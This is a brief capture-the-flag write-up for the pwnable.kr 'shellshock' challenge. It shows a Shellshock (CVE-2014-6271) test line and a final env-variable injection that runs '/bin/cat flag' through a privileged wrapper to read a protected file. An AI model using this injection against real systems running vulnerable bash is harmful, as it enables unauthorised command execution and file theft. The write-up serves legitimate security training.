# pwnable.kr -- Toddler's Bottle -- shellshock

## 1. Challenge

```
Mommy, there was a shocking news about bash.  
I bet you already know, but lets just make it sure :)  
    
ssh shellshock@pwnable.kr -p2222 (pw:guest)  
```

## 2. Solution

Connect via SSH.

In current directory, it provides a `bash` that has CVE-2014-6271 exploit.

We can test it by typing:

```bash
$ env x='() { :;}; echo fuckfuck' ./bash -c "echo haha"
```

And we can find that both `"fuckfuck"` and `"haha"` are typed out.

Review the source code of the binary file `shellshock`, which is in file `shellshock.c`. We can find that `shellshock` has right to read `flag` and it will launch the exploitable `bash`.

So, just type:

```bash
$ env x='() { :;}; /bin/cat flag' ./shellshock
```

Then you will see the flag.
